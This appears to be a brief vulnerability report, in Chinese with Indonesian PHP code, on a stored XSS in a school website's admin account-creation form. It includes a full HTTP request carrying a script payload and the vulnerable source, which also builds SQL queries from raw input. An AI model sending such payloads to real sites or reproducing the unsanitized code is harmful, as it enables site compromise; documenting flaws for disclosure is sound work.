```bash
POST /Admin/Proses_Input_Akun.php HTTP/1.1
Host: www.web-sekolah.com
Content-Length: 123
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.web-sekolah.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.web-sekolah.com/Admin/tambah_akun.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=m2ba3u72qvte536q1864qqamrk
Connection: close

Username=%5C%22%3E%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&Password=%5C%22%3E%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&Level=1
```

![1729591939852](./assets/1729591939852.png)

访问[SMK TERPADU](http://ip/Admin/akun.php)触发xss

```bash
<?php
include "../koneksi.php";

$Username = $_POST['Username'];
$Password = md5($_POST['Password']);
$Level = $_POST['Level'];

$sql = mysqli_query($koneksi,"SELECT * FROM `akun` WHERE username = '$Username' ") or die(mysql_error());
if(mysqli_num_rows($sql) == 0)
{
	$input_akun="INSERT INTO `akun` (`username`, `password`, `level`) VALUES ('$Username', '$Password', '$Level');";
	(mysqli_query($koneksi, $input_akun));
	header('location:akun.php');
}
else
{
	echo (" <SCRIPT LANGUAGE='JavaScript'>
				window.alert('Username sudah Terdaftar')
				window.location.href='akun.php';
			</SCRIPT>");
}
?>
```

接受参数之后，没有进行任何过滤直接存入数据库

![1729592170163](./assets/1729592170163.png)



